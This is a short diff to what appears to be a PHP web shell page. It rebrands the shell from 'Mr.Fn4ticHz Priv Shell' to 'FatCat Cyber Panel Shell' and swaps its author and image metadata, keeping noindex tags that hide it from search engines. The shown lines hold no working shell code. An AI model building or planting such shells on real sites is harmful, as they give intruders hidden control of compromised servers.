@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Mr.Fn4ticHz Priv Shell</title>
-    <meta name="author" content="Mr.Fn4ticHz">
+    <title>FatCat Cyber Panel Shell</title>
+    <meta name="author" content="FatCat Cyber Team">
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="description" content="Crushed Is Batter Than Fixing">
     <meta property="og:description" content="Crushed Is Batter Than Fixing">
-    <meta property="og:image" content="https://bbx-host.pw/bbr.jpg">
+    <meta property="og:image" content="https://imgur.com/48YgDZL.png">
     <meta name="robots" content="noindex">
     <meta name="googlebot" content="noindex">
     <meta name="theme-color" content="#1f1f1f">
@@ -145,7 +145,7 @@ async function loadFile(file) {
 }
 </script>
 <center>
-<font face="Bungee" size="5">Mr.Fn4ticHz Priv Shell</font></center>
+<font face="Bungee" size="5">FatCat Cyber Panel Shell</font></center>
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>
 <?php
